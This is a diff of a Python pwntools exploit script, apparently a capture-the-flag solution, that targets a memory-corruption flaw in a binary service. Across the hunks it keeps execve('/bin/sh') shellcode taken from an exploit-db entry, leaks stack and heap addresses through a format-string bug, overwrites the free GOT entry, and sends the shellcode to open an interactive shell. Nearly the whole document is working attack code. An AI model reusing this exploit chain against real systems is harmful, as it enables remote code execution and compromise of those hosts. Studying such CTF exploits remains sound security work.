@@ -12,8 +12,8 @@ else:
 
 nombre = 'physics'
 # https://www.exploit-db.com/exploits/42179
-shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
 shellcode = 'A' + 'B' * 29 + 'C'
+shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
 #nombre = shellcode
 free_GOT = 0x602000
 obj_o = 0x602098
@@ -41,17 +41,17 @@ def main():
 	conn.sendline(nombre)
 	conn.recvuntil('> ')
 
-	# get shellcode addr
-	conn.sendline('2')
-	conn.recvuntil('\n')
-	conn.sendline('%10$p')
-	line = conn.recvline()
-	leak = int(line[2:], 16)
-	print 'stack leak:' + hex(leak)
-	shellcode_addr = leak - 32
-	print 'shellcode addr:' + hex(shellcode_addr)
-	print ''
-	conn.recvuntil('> ')
+	### get shellcode addr
+	##conn.sendline('2')
+	##conn.recvuntil('\n')
+	##conn.sendline('%10$p')
+	##line = conn.recvline()
+	##leak = int(line[2:], 16)
+	##print 'stack leak:' + hex(leak)
+	##shellcode_addr = leak - 32
+	##print 'shellcode addr:' + hex(shellcode_addr)
+	##print ''
+	##conn.recvuntil('> ')
 	#print read_addr(shellcode_addr, text=True)
 	#for i in range(0x100):
 	#	print str(i)
@@ -61,19 +61,17 @@ def main():
 	#	except:
 	#		pass
 
-	# get shellcode addr
-	#if len(hex(shellcode_addr)) > 8:
-	#	print 'try again'
-	#	return
-	#print 'shellcode addr:' + hex(shellcode_addr)
-	# place shellcode on heap
-	#conn.interactive()
-
 
 
 
 	leak = read_addr(obj_o)
-	shellcode = 
+	print 'heap leak:' + hex(leak)
+	shellcode_addr = leak + 48
+	print 'shellcode addr:' + hex(shellcode_addr)
+	if len(hex(shellcode_addr)) > 8:
+		print 'Try again'
+		conn.close()
+		return
 	#conn.sendline('3')
 	#shellcode = 'A' + 'B' * 29 + 'C'
 	#conn.sendline(shellcode)
@@ -87,6 +85,11 @@ def main():
 	#		pass
 	#return
 
+	# get shellcode addr
+	#if len(hex(shellcode_addr)) > 8:
+	#	print 'try again'
+	#	return
+	#print 'shellcode addr:' + hex(shellcode_addr)
 
 
 
@@ -126,14 +129,10 @@ def main():
 	print 'new free addr:' + hex(read_addr(free_GOT))
 	#print 'shellcode:' + read_addr(shellcode_addr, text=True)
 
-	# place shellcode on heap
+	# pwn
 	conn.sendline('3')
 	conn.sendline(shellcode)
 	conn.interactive()
-	conn.recvuntil('> ')
-
-	# trigger shellcode
-	conn.sendline('4')
 	conn.close()
 
 if __name__ == '__main__':
